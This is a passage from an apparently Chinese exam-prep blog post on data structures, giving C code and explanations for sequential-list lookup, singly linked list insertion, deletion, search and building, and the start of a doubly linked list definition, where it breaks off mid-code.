+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">LocalElem</span><span class="p">(</span><span class="n">Sqlist</span> <span class="n">L</span><span class="p">,</span> <span class="n">Elemtype</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>  <span class="c1">//下标为i的元素值为e，返回其位序i+1
+</span></span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">//查找失败
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>最好时间复杂度：目标元素在表头（i=1），比较一次，时间复杂度为<strong>O(1)</strong>。
+最坏时间复杂度：目标元素在表尾或者不存在，比较n次，时间复杂度为<strong>O(n)</strong>。
+平均时间复杂度：设目标元素在第i位的概率为p=1/n，则平均比较次数为(1+n)*n/2 * p = (n+1)/2，故平均时间复杂度为<strong>O(n)</strong>。</p>
+<h3 id="23-单链表">2.3 单链表</h3>
+<p>本小节思维导图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260204203140644.png" alt=""></p>
+<h4 id="231-单链表的定义">2.3.1 单链表的定义</h4>
+<blockquote>
+<p>线性表的链式存储也称为<strong>单链表</strong>。他通过<strong>一组任意存储单元（不要求地址连续）</strong> 来存储线性表中的数据元素。</p>
+</blockquote>
+<p>简单来说，单链表的每个节点组成为<strong>数据域+指针域（只有一个指向后继节点的指针）</strong> ，与顺序表相比，单链表以<strong>失去顺序表的随机存储能力</strong>为代价，获取了<strong>比顺序表更高效率的插入和删除操作</strong>。在《考研视角下的C语言(下)》这篇文章中已经详细介绍了单链表这一数据结构，我就直接贴出链表节点的定义代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">LNode</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ElemType</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">LNode</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">LNode</span><span class="p">,</span> <span class="o">*</span><span class="n">LinkList</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//将LNode*重命名为LinkList，是为了在后续代码中强调节点和链表的不同，增加代码的可读性
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">LNode</span> <span class="o">*</span> <span class="n">LinkList</span><span class="p">;</span>
+</span></span></code></pre></div><p>单链表的结构其表示如图：
+<img src="http://tuchuang.mrlxl.cn/picture/20260123143328255.png" alt=""></p>
+<h4 id="232-单链表的两种初始化方式">2.3.2 单链表的两种初始化方式</h4>
+<p>单链表的初始化方式主要有两种，分别是<strong>带头结点和不带头结点（不是有节点和没节点，这是一种管理方式）</strong>。在《考研视角下的 C 语言（下）》中，采用的是不带头结点、通过双指针管理头指针的实现方式。
+这两种实现方式的<strong>主要区别</strong>在于：带头结点的单链表在初始化后，其<strong>后续的插入和删除操作</strong>在代码实现上更加简便。
+具体的插入与删除操作代码将在后续小节中给出，这里仅对这两种单链表的实现方式进行说明：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//带头结点的单链表初始化
+</span></span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InitList</span><span class="p">(</span><span class="n">Linklist</span> <span class="o">&amp;</span><span class="n">L</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="o">=</span><span class="p">(</span><span class="n">LNode</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">LNode</span><span class="p">));</span> <span class="c1">//创建头结点
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">L</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>  <span class="c1">//内存不足，分配失败
+</span></span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//不带头结点的单链表初始化
+</span></span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InitList</span><span class="p">(</span><span class="n">Linklist</span> <span class="o">&amp;</span><span class="n">L</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="233-单链表的插入操作">2.3.3 单链表的插入操作</h4>
+<p>在《考研视角下的 C 语言（下）》中，介绍了单链表在<strong>双指针管理和遍历模式</strong>的<strong>头插法和尾插法和有序插法</strong>，本节将进一步介绍在<strong>单指针管理和遍历模式</strong>下的<strong>按位序插法、指定节点插入、按位序删除、指定节点删除</strong>。</p>
+<p><strong>按位序插入（带头结点和不带头结点）:</strong>
+<strong>注意：头结点始终是头结点</strong>，即使插入新节点到位序为1的位置也是在头结点之后</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">node</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">LNode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="n">LNode</span><span class="o">*</span> <span class="n">Linklist</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">ListInsert</span><span class="p">(</span><span class="n">Linklist</span> <span class="o">&amp;</span><span class="n">L</span> <span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">NewNode</span> <span class="o">=</span> <span class="p">(</span><span class="n">LNode</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">LNode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="n">NewNode</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">NewNode</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//不带头结点相对于带头节点，第一个元素需要特殊处理
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//不带头结点加下面代码
+</span></span></span><span class="line"><span class="cl">	<span class="c1">//if (i == 1) {
+</span></span></span><span class="line"><span class="cl">	<span class="c1">//	NewNode-&gt;next = L;
+</span></span></span><span class="line"><span class="cl">	<span class="c1">//	L = NewNode;
+</span></span></span><span class="line"><span class="cl">	<span class="c1">//	return true;
+</span></span></span><span class="line"><span class="cl">	<span class="c1">//}
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">p</span> <span class="o">=</span> <span class="n">L</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//当前p指向的是第几个节点
+</span></span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//链接节点
+</span></span></span><span class="line"><span class="cl">	<span class="n">NewNode</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">NewNode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>指定节点前插操作（给出一个节点，在其之前插入新节点）：</strong>
+问题在于单指针方法并不知晓前驱节点，通过循环遍历找到其前驱节点的时间复杂度又为O(n)，于是我们采用<strong>伪后插方法来实现前插操作</strong>（后插节点，交换数据）时间复杂度仅为O(1)。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InsertNextNode</span><span class="p">(</span><span class="n">LNode</span><span class="o">*</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="n">LNode</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">LNode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//内存分配失败
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//交换数据
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">temp</span> <span class="o">=</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>指定节点后插操作（给出一个节点，在其之后插入新节点）：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InsertNextNode</span><span class="p">(</span><span class="n">LNode</span><span class="o">*</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="n">LNode</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">LNode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//内存分配失败
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="234-单链表的删除操作">2.3.4 单链表的删除操作</h4>
+<p><strong>按位序删除（带头结点和不带头结点）：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">ListDelete</span><span class="p">(</span><span class="n">Linklist</span> <span class="o">&amp;</span><span class="n">L</span> <span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//不带头结点加下面代码
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//if (i == 1) {
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//LNode* q = L;      // 指向第一个节点
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//data = q-&gt;data;     // 保存值
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//L = L-&gt;next;        // 头指针指向第二个节点
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//free(q);            // 释放原第一个节点
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//return true;
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//}
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">p</span> <span class="o">=</span> <span class="n">L</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//当前p指向的是第几个节点
+</span></span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//循环遍历让p指向被删除节点的前一个节点
+</span></span></span><span class="line"><span class="cl">		<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//删除节点
+</span></span></span><span class="line"><span class="cl">	<span class="n">LNode</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>  <span class="c1">//另q指向被删除节点
+</span></span></span><span class="line"><span class="cl">	<span class="n">data</span> <span class="o">=</span> <span class="n">q</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>  <span class="c1">//用data返回元素的值
+</span></span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">q</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>  <span class="c1">//断链
+</span></span></span><span class="line"><span class="cl">	<span class="nf">free</span><span class="p">(</span><span class="n">q</span><span class="p">);</span>  <span class="c1">//释放q指向的节点
+</span></span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>指定节点删除：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">DeleteNode</span><span class="p">(</span><span class="n">LNode</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//删除节点
+</span></span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">q</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>  <span class="c1">//另q指向被删除节点
+</span></span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>  <span class="c1">//和后继节点交换数据域
+</span></span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">q</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>  <span class="c1">//断链
+</span></span></span><span class="line"><span class="cl">	<span class="nf">free</span><span class="p">(</span><span class="n">q</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="235-单链表的查找">2.3.5 单链表的查找</h4>
+<p>本小节介绍的都是单链表在有头结点的管理方式下的<strong>按位查找和按值查找</strong>，代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//按位查找
+</span></span></span><span class="line"><span class="cl"><span class="n">LNode</span><span class="o">*</span> <span class="nf">GetElem</span><span class="p">(</span><span class="n">Linklist</span> <span class="n">L</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">L</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//头结点不存数据，但是也算下标为0的第一个节点
+</span></span></span><span class="line"><span class="cl">		<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//按值查找
+</span></span></span><span class="line"><span class="cl"><span class="n">LNode</span><span class="o">*</span> <span class="nf">GetElem</span><span class="p">(</span><span class="n">Linklist</span> <span class="n">L</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span><span class="o">*</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">L</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">data</span> <span class="o">!=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">		<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="236-单链表的建立">2.3.6 单链表的建立</h4>
+<p>所谓建立，就是指为空链表添加数据。本小节介绍在<strong>单指针管理模式下的带头结点的头插法和尾插法</strong>。</p>
+<p><strong>头插法：</strong>
+实现很简单，在头结点的位置调用前面定义的后插操作的函数 bool InsertNextNode(LNode* p, int data) 即可。代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">HeadInsert</span><span class="p">(</span><span class="n">Linklist</span><span class="o">&amp;</span> <span class="n">L</span><span class="p">,</span> <span class="kt">int</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">LNode</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">L</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">InsertNextNode</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>尾插法：</strong>
+同样简单，在前面定义的按位序插入的函数 bool ListInsert(Linklist &amp;L , int i, int data) 中传入的i的值为length+1（要插入的位置）即可。</p>
+<h3 id="24-双链表">2.4 双链表</h3>
+<p>本小节思维导图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260204200619901.png" alt="双链表思维导图"></p>
+<h4 id="241-双链表的定义">2.4.1 双链表的定义</h4>
+<p>单链表每个节点仅包含一个指向其后继的指针，故只能从前往后遍历。但若想访问一个链表中一个节点的前驱节点，除了在单链表中从头开始遍历或者双指针遍历外，还可采用<strong>双链表</strong>的这种数据结构。
+双链表的每个节点包含<strong>两个指针prior和next</strong>，分别指向直接前驱和直接后继，其中<strong>头结点的prior为NULL，尾节点的next为NULL</strong>。其结构示意图如下（带头结点）：
+<img src="http://tuchuang.mrlxl.cn/picture/20260204142241219.png" alt=""></p>
+<h4 id="242-双链表的实现方式">2.4.2 双链表的实现方式</h4>
+<p>带头结点初始化代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">node</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">prior</span><span class="p">,</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">DNode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="n">DNode</span><span class="o">*</span> <span class="n">DLinkList</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InitDLinkList</span><span class="p">(</span><span class="n">DLinkList</span><span class="o">&amp;</span> <span class="n">L</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span> <span class="o">=</span> <span class="p">(</span><span class="n">DNode</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DNode</span><span class="p">));</span>
